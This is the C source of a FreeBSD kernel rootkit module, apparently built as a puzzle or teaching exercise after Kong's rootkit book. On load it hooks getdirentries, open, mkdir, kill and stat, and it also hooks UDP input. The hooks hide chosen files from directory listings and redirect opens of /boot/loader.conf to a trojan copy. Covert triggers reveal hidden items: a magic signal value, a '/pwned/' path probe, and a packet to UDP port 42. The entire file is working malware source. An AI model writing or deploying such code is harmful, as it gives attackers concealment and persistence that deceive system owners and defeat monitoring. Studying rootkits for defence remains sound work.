/*
 * Incorporates code (getdirentries) based on code presented by J. Kong in
 * `Designing BSD Rootkits: An Introduction to Kernel Hacking`
 */
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/types.h>
#include <sys/malloc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/fcntl.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#include <sys/dirent.h>

#include <sys/mbuf.h>
#include <sys/sysctl.h>
#include <sys/protosw.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_var.h>
#include <netinet/ip_options.h>
#include <netinet/udp.h>
#include <netinet/udp_var.h>

extern struct protosw inetsw[];

/*
 * We hide loader.conf.42 and redirect all attempts to open
 * /boot/defaults/loader.conf to opening /boot/defaults/loader.conf.42
 */
#define FT_TREASURE     "treasure"
#define FT_LOADER       "42ader.conf"
#define FT_ROT13        "rot13"
#define FT_HELLOWORLD   "hello_world"
#define FT_PROCESS      "process"
#define FT_FOURTYTWO    "42"
#define FT_HIDEFILE     "hide_file"
/* Define this to be longer than any above string (arbitrarily long) */
#define FT_LEN          100

/* Our dirty one.  Must be same len as below */
#define FT_PATH         "/boot/loader.conf"
/* Our clean loader.conf */
char ft_trojan[]      = "/boot/42ader.conf";

/* Our unlock for rot13 */
#define FT_ROT13_UNLOCK "/pwned/"

/* File hiding flags */
static int ft_rot13_hidden = 1;
static int ft_process_hidden = 1;
static int ft_file_hidden = 1;
static int ft_42_hidden = 1;

static int open_hook(struct thread *td, void *syscall_args)
{
    struct open_args /* {
            char *path;
            int flags;
            int mode;
            } */ *uap = (struct open_args *)syscall_args;

    if (strcmp(uap->path, FT_PATH) == 0)
    {
        copyout(ft_trojan, uap->path, strlen(ft_trojan));
    }
    return open(td, uap);
}

static int mkdir_hook(struct thread *td, void *syscall_args)
{
    struct mkdir_args /* {
            char *path;
            int mode;
            } */ *uap = (struct mkdir_args *)syscall_args;

    if (strncmp(uap->path, FT_ROT13_UNLOCK, strlen(FT_ROT13_UNLOCK) - 1) == 0)
    {
        ft_rot13_hidden = 0;
    }
    return mkdir(td, syscall_args);
}

static int kill_hook(struct thread *td, void *syscall_args)
{
    struct kill_args /* {
            int pid;
            int signum;
            } */ *uap = (struct kill_args *)syscall_args;
    
    if (uap->pid == 1337 && uap->signum == 1337)
    {
        ft_process_hidden = 0;
        return 0;
    }
    else
    {
        return kill(td, syscall_args);
    }
}

static int stat_hook(struct thread *td, void *syscall_args)
{
    struct stat_args /* {
            char *path;
            } */ *uap = (struct stat_args *)syscall_args;
    
    if (strncmp(uap->path, FT_ROT13_UNLOCK, strlen(FT_ROT13_UNLOCK) - 1) == 0)
    {
        ft_file_hidden = 0;
    }
    return stat(td, syscall_args);
}

static int getdirentries_hook(struct thread *td, void *syscall_args)
{
    struct getdirentries_args /* {
        int fd;
        char *buf;
        u_int count;
        long *basep;
    } */ *uap;
    uap = (struct getdirentries_args *) syscall_args;

    struct dirent *dp;
    struct dirent *current;
    unsigned int size;
    int count;
    char *curname;
    int len;

    int hide;

    /* man 2 getdirentries */
    getdirentries(td, syscall_args);
    /*
     * struct thread declared sys/proc.h
     * this is the size of the directory entries returned
     */
    size = td->td_retval[0];

    /* We only need to seach for dirents to hide if there are dirents */
    if (size > 0)
    {
        /* Make a temporary buffer in kernel space to manipulate buf */
        MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
        copyin(uap->buf, dp, size);

        current = dp;
        count = size;

        /*
         * Iterate through the dirents and remove all hidden files.
         * getdirentries always a record with length 0 at the end.
         * count is used to return the number of bytes left in the buf
         * (excluding current dirent).
         */
        while ((current->d_reclen != 0) && (count > 0))
        {
            hide = 0;
            /*
             * Shorten the number of bytes left.
             * At this point, count is the number of unexamined dirents.
             * Since we are examining current in this iteration, we will
             * remove it from the count of bytes remaining.
             */
            count -= current->d_reclen;

            /*
             * Does the current record match any we wish to hide?
             */
            curname = (char *) &(current->d_name);
            len = strlen(curname);
            hide |= (strncmp(curname, FT_TREASURE,    FT_LEN) == 0) ? 1 : 0;
            hide |= (strncmp(curname, FT_LOADER,      FT_LEN) == 0) ? 1 : 0;
            hide |= (strncmp(curname, FT_HELLOWORLD,  FT_LEN) == 0) ? 1 : 0;
            hide |= (strncmp(curname, FT_ROT13,       FT_LEN) == 0
                    && ft_rot13_hidden                      ) ? 1 : 0;
            hide |= (strncmp(curname, FT_PROCESS,     FT_LEN) == 0
                    && ft_process_hidden                    ) ? 1 : 0;
            hide |= (strncmp(curname, FT_HIDEFILE,    FT_LEN) == 0
                    && ft_file_hidden                       ) ? 1 : 0;
            hide |= (strncmp(curname, FT_FOURTYTWO,   FT_LEN) == 0
                    && ft_42_hidden                         ) ? 1 : 0;

            /*
             * If so we will remove it from the buf of dirents
             */
            if (hide != 0)
            {
                size -= current->d_reclen;
                /*
                 * This copies count bytes from the next record on, overtop
                 * of the current record (effectively remvoing it).
                 */
                bcopy((char *)current + current->d_reclen, current, count);
            }
            /*
             * Advance to the next record if necessary
             */
            else if (count > 0)
            {
                current = (struct dirent *)((char *)current +
                        current->d_reclen);
            }
        }
        /* Modify our return size (or write over it with the original value) */
        td->td_retval[0] = size;
        /* Copy the data out of kernel space to user space */
        copyout(dp, uap->buf, size);

        /* Free our temporary buffer in the kernel */
        FREE(dp, M_TEMP);
    }

    return 0;
}

void udp_input_hook(struct mbuf *m, int off);
void udp_input_hook(struct mbuf *m, int off)
{
    int iphlen = off;
    struct ip *ip;
    struct udphdr *uh;

    /* Strip IP options, if they exist. */
    if (iphlen > sizeof (struct ip))
    {
        ip_stripoptions(m, (struct mbuf *)0);
        iphlen = sizeof (struct ip);
    }

    /*
     * Get IP and UDP header together in first mbuf.
     */
    ip = mtod(m, struct ip *);
    if (m->m_len < iphlen + sizeof(struct udphdr))
    {
        if ((m = m_pullup(m, iphlen + sizeof(struct udphdr))) == 0)
        {
            /* udpstat.udps_hdrops++; */
            return;
        }
        ip = mtod(m, struct ip *);
    }
    uh = (struct udphdr *)((caddr_t)ip + iphlen);

    /*
     * Check the dest port
     */
    if (ntohs(uh->uh_dport) == 42)
    {
        /* This meets my requirements for unhiding */
        ft_42_hidden = 0;
        return;
    }

    udp_input(m, off);
}

static int load(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd)
    {
        case MOD_LOAD:
            sysent[SYS_getdirentries].sy_call =
                (sy_call_t *) getdirentries_hook;
            sysent[SYS_open].sy_call = (sy_call_t *)open_hook;
            sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;
            sysent[SYS_kill].sy_call = (sy_call_t *)kill_hook;
            sysent[SYS_stat].sy_call = (sy_call_t *)stat_hook;
            inetsw[ip_protox[IPPROTO_UDP]].pr_input = udp_input_hook;
            break;
        case MOD_UNLOAD:
            sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries;
            sysent[SYS_open].sy_call = (sy_call_t *)open;
            sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir;
            sysent[SYS_kill].sy_call = (sy_call_t *)kill;
            sysent[SYS_stat].sy_call = (sy_call_t *)stat;
            inetsw[ip_protox[IPPROTO_UDP]].pr_input = udp_input;
            break;
    }

    return error;
}

static moduledata_t hide_file_mod = {
    "hide_file",    /* module name */
    load,           /* event handler */
    NULL            /* No extra data */
};

DECLARE_MODULE(hide_file, hide_file_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
